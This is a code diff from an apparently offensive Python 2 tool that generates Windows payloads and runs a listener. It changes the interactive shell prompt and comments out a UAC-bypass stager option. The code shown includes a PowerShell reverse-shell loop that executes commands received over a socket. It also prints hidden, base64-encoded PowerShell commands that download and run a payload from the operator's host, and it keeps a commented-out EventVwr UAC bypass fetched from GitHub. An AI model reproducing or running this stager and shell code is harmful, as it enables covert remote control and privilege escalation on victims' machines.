@@ -98,12 +98,12 @@ def interactShell(clientconn,clientnumber):
     from menu import clientMenuOptions
     print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\nuacbypass - UacBypass To Open New Admin Connection\n" + "-"*50
     while True:
-        while clientconn in select.select([clientconn], [], [], 0.2)[0]:
+        while clientconn in select.select([clientconn], [], [], 0.1)[0]:
             computerName += clientconn.recv(2048)
             if len(computerName) > 1:
                 print t.bold_yellow + computerName + t.normal
 
-        command = raw_input("> ")
+        command = raw_input(" ")
         if command.lower() == "back":
             break
         elif command.lower() == "uacbypass":
@@ -153,7 +153,7 @@ def printListener():
         "if ($i -lt 1){exit};"
         "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i).replace(\"`0\",\"\");"
         "if ($d.Length -gt 0){$cb = (iex -c $d 2>&1 | Out-String);"
-        "$br = $cb + ($error[0] | Out-String) + ($pwd.path) + \"`0\";$error.clear();"
+        "$br = $cb + ($error[0] | Out-String) + 'PS ' + (Get-Location).Path + '>' + \"`0\";$error.clear();"
         "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);"
         "$sl.Flush()}}")
 
@@ -164,11 +164,11 @@ def printListener():
     global randoStagerDLPort # need to fix asap. Globals are shit fam
     randoStagerDLPort = random.randint(5000,9000)
     FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
-    uacBypassStager = raw_input(t.bold_green + "Use UAC bypass for stager? y/[N]: " + t.normal)
-    if uacBypassStager.lower() == 'y':
-        print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1\");Invoke-EventVwrBypass -Command \"powershell.exe -c IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')\"").encode('utf_16_le').encode('base64').replace('\n','')
-    else:
-        print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
+    #uacBypassStager = raw_input(t.bold_green + "Use UAC bypass for stager? y/[N]: " + t.normal)
+    #if uacBypassStager.lower() == 'y':
+        #print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1\");Invoke-EventVwrBypass -Command \"powershell.exe -c IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')\"").encode('utf_16_le').encode('base64').replace('\n','')
+    #else:
+    print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
     return "pass"
 
 def pingClients(clientconn,clientnumber):
